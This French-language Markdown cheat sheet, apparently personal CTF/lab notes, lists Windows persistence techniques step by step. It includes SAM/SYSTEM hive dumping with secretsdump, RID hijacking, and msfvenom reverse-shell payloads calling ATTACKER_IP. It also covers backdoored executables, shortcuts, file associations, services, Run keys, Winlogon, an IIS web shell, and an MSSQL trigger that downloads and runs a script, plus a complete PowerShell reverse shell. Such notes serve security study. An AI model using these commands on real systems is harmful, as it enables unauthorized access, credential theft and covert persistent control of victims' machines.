# Windows
Quelques techniques de persistence sur windows

## Commandes

```
evil-winrm -i <IP> -u MyUser -p MyPassword
xfreerdp /u:MyUser /p:MyPassword /v:<IP> +clipboard
```

<br>
<br>

## Sur la machine [victime]
```
net localgroup administrators MyUser /add
net localgroup "Backup Operators" MyUser /add
net localgroup "Remote Management Users" MyUser /add
```
Si winrm, pour bypass <a href="https://learn.microsoft.com/fr-fr/windows/security/application-security/application-control/user-account-control/how-it-works">UAC</a>
```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Avec un utilisateur qui a les privilèges [WinRM] <a href="https://github.com/fortra/impacket">Repo GitHub ici!</a>
```
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download system.bak
download sam.bak
```
[Attaquant]
```
python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
evil-winrm -i 10.10.66.252 -u Administrator -H <theHash>
```
<br>
<br>

## Special Privileges and Security Descriptors

```
secedit /export /cfg config.inf
```
![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/58320646-9e80-4e67-8fa1-7d529653acc9)

```
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
```
On doit maintenant avoir les privilèges `Backup Operator`.

si utilisation de winrm, sur le GUI taper [PowerShell]
```
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```
Y ajouter l'utilisateur

<br>
<br>

## RID Hijacking
Check des utilisateurs avec leur RID
```
wmic useraccount get name,sid
```
```
PsExec64.exe -i -s regedit
```

Sous `HKLM\SAM\SAM\Domains\Account\Users\`, chercher la valeur hexadécimal qui correspond au RID de l'utilisateur souhaité. Tool en ligne pour convertir les RID en hexadécimal <a href="https://www.to-convert.com/fr/nombre/convertir-decimal-en-hexadecimal.php">ici</a>.
<br>
UNe fois qu'on a trouvé la valeur qui correspond à notre utilisateur, on ouvre le dossier pour éditer la valeur de `F` à la ligne 0030 (correspond au RID en little-endian c'est-à-dire <strong>inversé</strong>)

![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/82e4b1fa-a8ed-43fe-ae39-84cc08a64fff)
<br>
On va cherché à lui donner la valeur de celui de l'administrateur à savoir RID=500 donc `01F4` (`F401` en little-endian)! 

![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/bdeef6ac-10eb-479e-9173-98dbc9efaa4f)

La prochaine fois que le user se connectera LSASS associera à celui-ci, le même RID que l'administrateur !

<br>
<br>

## Executable Files

Avec `evil-winrm` télécharger en local le fichier exécutable (exemple avec PuTTY)
```
download "C:\Program Files\PuTTY\putty.exe"
```
ensuite 
```
msfvenom -a x64 -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```
On réupload derrière
```
upload puttyX.exe
```
<br>
<br>

## Shortcut Files

Script PowerShell pour reverse shell <a href="https://github.com/martinsohn/PowerShell-reverse-shell/tree/main">ici</a>.
<br>
<br>
Créer un fichier `backdoor.ps1` par exemple ici : `C:\Windows\System32\backdoor.ps1`.
<br>
Faire propriété sur un raccourci du bureau et y coller dans `Target` :
```
Start-Process -NoNewWindow "C:\Windows\System32\backdoor.ps1 ATTACKER_IP 4445"

C:\Windows\System32\<file>.exe
```
Penser aussi à changer l'icône !
<br>
<br>

## Hijacking File Associations (exemple avec .txt)
Ouvrir `regedit.exe`
<br>
Se rendre ici 
```
HKLM\Software\Classes\.txt
```
![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/d7767880-f541-4ca9-aeaa-9f197a1125b0)

Ensuite 
```
HKLM\Software\Classes\txtfile\shell\open\command
```
![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/80ca377c-f582-4aa9-a851-cdd0b7e4b4ab)


On créer une backdoor.ps1 quelque part dans l'arborescence, puis on modifie la valeur `Data`
```
Start-Process -NoNewWindow "c:\Windows\System32\backdoor.ps1 ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

<br>
<br>

## Creating backdoor services

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=1337 -f exe-service -o rev-svc.exe
nc -lnvp 1337
```
[evil-winrm]
```
upload rev-svc.exe
sc.exe create MyService binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start MyService
```
<br>
<br>

## Modifying existing services
Reconnaissance
```
sc.exe query state=all
```
Interroger un service
```
sc.exe qc TheService
```
Payload
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
nc -lnvp 5558
```
[evil-winrm]
```
upload rev-svc2.exe
sc.exe config TheService binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
sc.exe stop/start TheService
```

<br>
<br>

## Startup folder

Tous les utilisateurs ont un répertoire sous
```
%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```
qui permet d'exécuter des programmes à chaque démarrage.
<br>
Si besoin que tous les utilisateurs d'un même poste exécute un script au démarrage
```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

[Attaquant]
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
```
Transférer le fichier vers la machine victime (wget ou evil-winrm) Dans la destination choisie. Puis réouvrir une session avec le user.

<br>
<br>

## Run / RunOnce

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

```
Placer le reverse shell dans un endroit sneaky ex: `C:\Windows`
```
move revshell.exe C:\Windows
```
Ensuite on créer un `REG_EXPAND_SZ` sous `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`

![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/a69e402c-7d25-4094-becb-d3bec41f289f)

<br>
<br>

## Winlogon

Point interressant pour de la persistence 
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
```

`Userinit` pointe vers `userinit.exe` qui est en charge de restauré les préférences du profile.
<br>
`shell` qui pointe vers le shell du système qui est `explorer.exe`.

![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/f61184aa-fe02-49a3-83e7-40bdedcbc800)

même principe avec le reverseshell caché dans l'arborescence, on peut modifier la valeur de la clé de registre (exemple avec `Userinit`)
```
C:\Windows\system32\userinit.exe, C:\Windows\revshell.exe

```
![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/9801829f-531e-4404-a0c6-b41800d1dbf4)

## Logon Scripts

`userinit.exe`, lorsqu'il se charge va chercher une variable d'environnement appelée `UserInitLogonScript` la variable n'est pas mise par défaut.

```
HKCU\Environment
```

![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/bdd14b9e-0e55-4d12-918c-7ff6d8dfe29e)

<br>
<br>
## Web Shells

Si Serveur IIS, utiliser ce <a href="https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx">shell</a> et le mettre dans `C:\inetpub\wwwroo` (répertoire par défaut).

```
move shell.aspx C:\inetpub\wwwroot\
icacls shell.aspx /grant Everyone:F
```
Y accéder
```
http://<Domain>/shell.aspx
```
<br>
<br>

## MSSQL as a Backdoor

Ouvrir `Microsoft SQL Server Management Studio 18`
<br>
![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/5d12c83f-eebb-4369-b42f-d1f02c5b2f15)

```
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

Appuyer sur Execute

```
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

Appuyer sur Execute

```
USE HRDB
```

Appuyer sur Execute

```
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

Appuyer sur Execute

### Script evilscript.ps1

```
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

Il faut donc ouvrir 2 terminaux, un avec un serveur `python3 -m http.server` et un listener.
<br>
Dès qu'il y aura un INSERT dans la table, cela déclenchera un reverse shell.
